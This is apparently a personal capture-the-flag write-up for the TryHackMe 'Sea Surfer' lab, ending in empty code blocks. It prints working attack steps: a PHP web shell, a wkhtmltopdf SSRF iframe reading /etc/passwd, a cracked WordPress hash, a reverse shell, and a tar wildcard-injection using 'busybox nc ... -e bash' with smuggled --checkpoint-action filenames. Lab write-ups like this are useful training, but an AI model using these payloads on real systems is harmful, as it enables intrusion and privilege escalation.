---
tags:
title: Sea Surfer - Easy (THM)
permalink: /Sea-Surfer-THM-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
 ---
# Recon

```bash 
nmapf 10.67.173.177
Completed SYN Stealth Scan at 00:03, 21.43s elapsed (65535 total ports)
Nmap scan report for 10.67.173.177
Host is up, received reset ttl 63 (7.5s latency).
Scanned at 2026-04-13 00:02:49 -03 for 22s
Not shown: 54397 filtered tcp ports (no-response), 11136 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 21.46 seconds
           Raw packets sent: 189975 (8.359MB) | Rcvd: 17760 (710.404KB)
nmapf:7: command not found: ep
```

![[Pasted image 20260413000433.png]]

![[Pasted image 20260413000504.png]]

```bash
$ vhost seasurfer.thm
internal                [Status: 200, Size: 3072, Words: 225, Lines: 109, Duration: 308ms]
```

![[Pasted image 20260413000844.png]]

![[Pasted image 20260413001249.png]]

![[Pasted image 20260413001227.png]]


![[Pasted image 20260413002705.png]]

```bash
[Apr 13, 2026 - 00:25:10 (-03)] exegol-test /workspace # www
[lo] 0.250.250.65
[eth0@if14] 192.168.139.2
[docker0] 192.168.215.1
[/workspace]
allPorts  ferox-http_internal_seasurfer_thm_-1776050708.state  Silentium  Team
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
127.0.0.1 - - [13/Apr/2026 00:26:35] "GET /?test%3E%3Cbr%3EAdditional%20information:%20%7B%7B7*7%7D%7D%3C/td%3E%3C/tr%3E%3C/table%3E%3C/td%3E%3C/tr%3E%3Ctr%20class= HTTP/1.1" 200 -
```

```bash
[Apr 13, 2026 - 00:28:53 (-03)] exegol-test /workspace # cat shell.php
<?php system($_GET['cmd']); ?>
```

```bash
[Apr 13, 2026 - 00:37:20 (-03)] exegol-test /workspace # exiftool 13042026-fosLgnpp3gQg6zlyQc3Q.pdf
ExifTool Version Number         : 12.57
File Name                       : 13042026-fosLgnpp3gQg6zlyQc3Q.pdf
Directory                       : .
File Size                       : 54 kB
File Modification Date/Time     : 2026:04:13 00:33:12-03:00
File Access Date/Time           : 2026:04:13 00:37:08-03:00
File Inode Change Date/Time     : 2026:04:13 00:37:08-03:00
File Permissions                : -rw-rw----
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Title                           : Receipt
Creator                         : wkhtmltopdf 0.12.5
Producer                        : Qt 4.8.7
Create Date                     : 2026:04:13 03:33:12Z
Page Count                      : 1
```

https://github.com/andrei2308/CVE-2020-21365-PoC/blob/main/index.html

![[Pasted image 20260413005429.png]]

```bash
<?php header('location:file://'.$_REQUEST['x']); ?>
```

```bash
<iframe height="2000" width="800" src="http://192.168.210.140:8888/info.php?x=/etc/passwd"></iframe>
```

```bash
python3 -m http.server 8888
```

![[Pasted image 20260413005759.png]]

```bash
coolDataTablesMan:wpuser
```

![[Pasted image 20260413010244.png]]

![[Pasted image 20260413010503.png]]

![[Pasted image 20260413014156.png]]

![[Pasted image 20260413014222.png]]

```bash
[Apr 13, 2026 - 01:46:42 (-03)] exegol-test Sea # j hash
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 ASIMD 4x2])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 10 OpenMP threads
Note: Passwords longer than 13 [worst case UTF-8] to 39 [ASCII] rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
jenny4ever       (?)
1g 0:00:00:12 DONE (2026-04-13 01:46) 0.08210g/s 41195p/s 41195c/s 41195C/s kill123456..jazzyrox
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed
```

![[Pasted image 20260413015216.png]]

https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

![[Pasted image 20260413015529.png]]

```bash
curl 'http://10.11.1.234/wp-content/themes/twentytwelve/404.php'
```

```bash
[Apr 13, 2026 - 01:51:35 (-03)] exegol-test Sea # nc -nvlp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 127.0.0.1.
Ncat: Connection from 127.0.0.1:51364.
Linux ip-10-67-189-65 5.15.0-138-generic #148~20.04.1-Ubuntu SMP Fri Mar 28 14:32:35 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
Error: /proc must be mounted
  To mount /proc at boot you need an /etc/fstab line like:
      proc   /proc   proc    defaults
  In the meantime, run "mount proc /proc -t proc"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

```bash
www-data@ip-10-67-189-65:/var/www/internal/maintenance$ cat backup.sh
#!/bin/bash

# Brandon complained about losing _one_ receipt when we had 5 minutes of downtime, set this to run every minute now >:D
# Still need to come up with a better backup system, perhaps a cloud provider?

cd /var/www/internal/invoices
tar -zcf /home/kyle/backups/invoices.tgz *
```

```bash
www-data@ip-10-67-189-65:/var/www/internal/invoices$ cd /var/www/internal/invoices
www-data@ip-10-67-189-65:/var/www/internal/invoices$ echo "busybox nc 192.168.210.140 4444 -e bash" > exploit.sh
www-data@ip-10-67-189-65:/var/www/internal/invoices$ touch -- "--checkpoint=1"
www-data@ip-10-67-189-65:/var/www/internal/invoices$ touch -- "--checkpoint-action=exec=sh exploit.sh"
www-data@ip-10-67-189-65:/var/www/internal/invoices$
```

```bash
[Apr 13, 2026 - 01:51:53 (-03)] exegol-test Sea # nc -nvlp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 127.0.0.1.
Ncat: Connection from 127.0.0.1:57566.
whoami
kyle
```

```bash
kyle@ip-10-67-189-65:~$ cat user.txt
THM{SSRFING_TO_LFI_TO_RCE}
```

```bash
kyle@ip-10-67-189-65:~/.ssh$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICcBBotpd5/8kJmbemwI/+jMbGQBTpvg/7VCacfmB+7T root@exegol-test' > authorized_keys

ssh -i /root/.ssh/id_ed25519 kyle@seasurfer.thm
```

```bash
kyle@ip-10-67-189-65:/tmp$ id
uid=1000(kyle) gid=1000(kyle) groups=1000(kyle),4(adm),24(cdrom),27(sudo),30(dip),33(www-data),46(plugdev)
kyle@ip-10-67-189-65:/tmp$ sudo su
[sudo] password for kyle:
```


```bash
╔══════════╣ Checking sudo tokens (T1548.003)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#reusing-sudo-tokens
ptrace protection is enabled ()
Sudo token directory perms:
drwx------ 2 root root 60 Apr 13 05:01 /var/run/sudo/ts

doas.conf Not Found
```

```bash
https://sourceware.org/pub/gdb/releases/?C=M;O=D
```

```bash
[Apr 13, 2026 - 02:33:46 (-03)] exegol-test Sea # wget http://ftp.us.debian.org/debian/pool/main/g/gdb/gdb_13.1-3_amd64.deb
--2026-04-13 02:33:55--  http://ftp.us.debian.org/debian/pool/main/g/gdb/gdb_13.1-3_amd64.deb
Resolving ftp.us.debian.org (ftp.us.debian.org)... 208.80.154.139, 64.50.233.100, 64.50.236.52, ...
Connecting to ftp.us.debian.org (ftp.us.debian.org)|208.80.154.139|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3962052 (3.8M) [application/vnd.debian.binary-package]
Saving to: ‘gdb_13.1-3_amd64.deb’

gdb_13.1-3_amd64.deb                          100%[==============================================================================================>]   3.78M  2.14MB/s    in 1.8s

2026-04-13 02:33:57 (2.14 MB/s) - ‘gdb_13.1-3_amd64.deb’ saved [3962052/3962052]
```

```bash
kyle@ip-10-67-189-65:~$ ar x gdb.deb
kyle@ip-10-67-189-65:~$ ls
activate_sudo_token  backups  control.tar.xz  data.tar.xz  debian-binary  exploit.sh  ex.sh  gdb.deb  snap  user.txt
kyle@ip-10-67-189-65:~$ tar -xvf data.tar.xz
./
./etc/
./etc/gdb/
./etc/gdb/gdbinit
./etc/gdb/gdbinit.d/
```

```bash
https://manpages.ubuntu.com/manpages/focal/man1/gdb.1.html
```

```bash

```

```bash

```

```bash

```
